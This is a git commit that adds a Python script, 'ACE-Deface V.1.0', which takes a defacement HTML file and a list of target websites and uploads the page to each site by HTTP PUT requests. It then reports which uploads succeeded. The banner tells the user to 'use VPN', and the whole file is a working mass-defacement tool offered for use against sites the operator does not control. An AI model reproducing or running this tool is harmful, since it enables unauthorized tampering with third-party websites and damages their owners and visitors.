c4cbef1183203ce53957d7dfeaa7a70e968163d7
Lovely <83523587+CPScript@users.noreply.github.com>
2023-10-19 02:26:41 +0000

    Create aceV1.py

---
+++ Versions/aceV1.py
@@ -0,0 +1,74 @@
+#-*- coding: utf-8 -*-
+
+try:
+   import requests
+   import os.path
+   import sys
+except ImportError:
+   exit("install requests and try again ...")
+
+banner = """
+             ＿＿
+　　　　 　 / ＞　　フ   
+ 　　　　　| 　_　 _ l   Author : Disease (CPScript)
+　 　　 　／` ミ＿xノ    Date   : 8-18-2023
+　　 　 /　　　 　 |     Tools  : ACE-Deface V.1.0
+　　　 /　 ヽ　　 ﾉ      Note   : Please use VPN!
+　 　 │　　|　|　|
+　／￣|　　 |　|　|
+　| (￣ヽ＿ヽ)__)
+　 ＼二つ
+"""
+
+b = '\033[31m'
+h = '\033[32m'
+m = '\033[00m'
+
+def x(tetew):
+   ipt = ''
+   if sys.version_info.major > 2:
+      ipt = input(tetew)
+   else:
+      ipt = raw_input(tetew)
+   
+   return str(ipt)
+
+def ace(script,target_file="targets.txt"):
+   op = open(script,"r").read()
+   with open(target_file, "r") as target:
+      target = target.readlines()
+      s = requests.Session()
+      print("uploading to %d website"%(len(target)))
+      for web in target:
+         try:
+            site = web.strip()
+            if site.startswith("http://") is False:
+               site = "http://" + site
+            req = s.put(site+"/"+script,data=op)
+            if req.status_code < 200 or req.status_code >= 250:
+               print(m+"["+b+" FAILED!"+m+" ] %s/%s"%(site,script))
+            else:
+               print(m+"["+h+" SUCCESS"+m+" ] %s/%s"%(site,script))
+
+         except requests.exceptions.RequestException:
+            continue
+         except KeyboardInterrupt:
+            print; exit()
+
+def main(__bn__):
+   print(__bn__)
+   while True:
+      try:
+         a = x("Enter your deface script (EX: deface_script.html): ")
+         if not os.path.isfile(a):
+            print("file '%s' not found"%(a))
+            continue
+         else:
+            break
+      except KeyboardInterrupt:
+         print; exit()
+
+   ace(a)
+
+if __name__ == "__main__":
+    main(banner)
